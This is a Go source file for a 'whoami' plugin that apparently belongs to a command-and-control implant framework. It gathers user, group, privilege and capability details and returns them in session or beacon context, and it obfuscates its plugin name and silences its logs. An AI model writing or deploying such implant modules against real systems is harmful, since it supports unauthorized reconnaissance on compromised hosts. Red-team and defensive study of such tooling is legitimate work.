package main

import (
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"os/user"
	"runtime"
	"sort"
	"strings"

	"src/Client/dynamic/shared"
	"src/Client/generic/config"
	Logger "src/Client/generic/logger"

	hclog "github.com/hashicorp/go-hclog"
	"github.com/hashicorp/go-plugin"
)

//go:embed obfuscate.json
var obfuscateJSON []byte

var pluginName string

const pluginKey = "whoami"

func init() {
	pluginName = pluginKey

	type entry struct {
		ObfuscatedName string `json:"obfuscation_name"`
	}
	var m map[string]entry
	if err := json.Unmarshal(obfuscateJSON, &m); err == nil {
		if e, ok := m[pluginKey]; ok {
			if n := strings.TrimSpace(e.ObfuscatedName); n != "" {
				pluginName = n
			}
		}
	}
}

type whoamiInfo struct {
	Username   string   `json:"username"`
	UID        string   `json:"uid"`
	GID        string   `json:"gid"`
	HomeDir    string   `json:"home_dir"`
	Groups     []string `json:"groups"`
	Platform   string   `json:"platform"`
	Privileged bool     `json:"privileged"`
	Notes      []string `json:"notes"`
}

func collectWhoami() whoamiInfo {
	info := whoamiInfo{Platform: runtime.GOOS}
	cur, err := user.Current()
	if err == nil && cur != nil {
		info.Username = cur.Username
		info.UID = cur.Uid
		info.GID = cur.Gid
		info.HomeDir = cur.HomeDir
	}

	// Groups where supported
	if cur != nil {
		gids, err := cur.GroupIds()
		if err == nil {
			// Try to resolve to names, but keep IDs if resolution fails
			names := make([]string, 0, len(gids))
			for _, g := range gids {
				// Best-effort: not all platforms resolve by gid string
				if grp, err := user.LookupGroupId(g); err == nil {
					if grp != nil && grp.Name != "" {
						names = append(names, fmt.Sprintf("%s(%s)", grp.Name, g))
						continue
					}
				}
				names = append(names, g)
			}
			sort.Strings(names)
			info.Groups = names
		} else {
			// Ignore if unsupported on platform
		}
	}

	// Privilege detection
	if runtime.GOOS == "windows" {
		// Use dedicated Windows Token APIs (implemented in winpriv_windows.go)
		enrichWindowsPrivileges(&info)
	} else {
		// Unix: uid == 0 means root
		if info.UID == "0" {
			info.Privileged = true
		}
	}

	return info
}

func whoamiString() string {
	w := collectWhoami()
	var b strings.Builder
	fmt.Fprintf(&b, "User      : %s\n", w.Username)
	if w.UID != "" || w.GID != "" {
		fmt.Fprintf(&b, "UID/GID   : %s/%s\n", w.UID, w.GID)
	}
	if w.HomeDir != "" {
		fmt.Fprintf(&b, "Home      : %s\n", w.HomeDir)
	}
	if len(w.Groups) > 0 {
		fmt.Fprintf(&b, "Groups    : %s\n", strings.Join(w.Groups, ", "))
	}
	fmt.Fprintf(&b, "Platform  : %s\n", w.Platform)
	fmt.Fprintf(&b, "Privileged: %v\n", w.Privileged)
	if len(w.Notes) > 0 {
		fmt.Fprintf(&b, "Notes     : %s\n", strings.Join(w.Notes, "; "))
	}

	// Extra detail via APIs (no external commands)
	switch runtime.GOOS {
	case "windows":
		if wgrps := getWindowsGroupNames(); len(wgrps) > 0 {
			b.WriteString("\n[Windows Groups]\n")
			b.WriteString(strings.Join(wgrps, "\n"))
			b.WriteString("\n")
		}
		if wpriv := getWindowsPrivilegesSummary(); strings.TrimSpace(wpriv) != "" {
			b.WriteString("\n[Windows Privileges]\n")
			b.WriteString(wpriv)
			if !strings.HasSuffix(wpriv, "\n") {
				b.WriteString("\n")
			}
		}
	case "linux":
		if sel := getSELinuxContext(); strings.TrimSpace(sel) != "" && !strings.Contains(sel, "invalid") {
			b.WriteString("\n[SELinux context]\n")
			b.WriteString(sel)
			if !strings.HasSuffix(sel, "\n") {
				b.WriteString("\n")
			}
		}
		if caps := getLinuxCapabilities(); len(caps) > 0 {
			b.WriteString("\n[Linux Capabilities]\n")
			b.WriteString(strings.Join(caps, "\n"))
			b.WriteString("\n")
		}
	}
	return b.String()
}

// WhoamiCommand implements the shared.Command interface.
type WhoamiCommand struct{}

func (c *WhoamiCommand) Execute(args []string) (string, error) {
	Logger.Log("WhoamiCommand.Execute called")
	return whoamiString(), nil
}

func (c *WhoamiCommand) ExecuteFromSession(args []string) (string, error) {
	Logger.Log("WhoamiCommand.ExecuteFromSession called")
	out, err := c.Execute(args)
	if err != nil {
		return "", err
	}
	return "--- Whoami (Session Context) ---\n" + out + "--------------------------------", nil
}

func (c *WhoamiCommand) ExecuteFromBeacon(args []string, data string) (string, error) {
	Logger.Log("WhoamiCommand.ExecuteFromBeacon called")
	out, err := c.Execute(args)
	if err != nil {
		return "", err
	}
	if strings.TrimSpace(data) != "" {
		return fmt.Sprintf("--- Whoami (Beacon Context) ---\nBeacon Data: %s\n%s----------------------------------", data, out), nil
	}
	return "--- Whoami (Beacon Context) ---\n" + out + "----------------------------------", nil
}

func main() {
	// Silence plugin logs unless in debug
	var plog hclog.Logger
	if config.IsDebug() {
		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin." + pluginName, Level: hclog.Debug})
	} else {
		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin." + pluginName, Level: hclog.Off, Output: io.Discard})
	}

	plugin.Serve(&plugin.ServeConfig{
		HandshakeConfig: shared.HandshakeConfig,
		Plugins: map[string]plugin.Plugin{
			pluginName: &shared.CommandPlugin{Impl: &WhoamiCommand{}},
		},
		Logger: plog,
	})
}
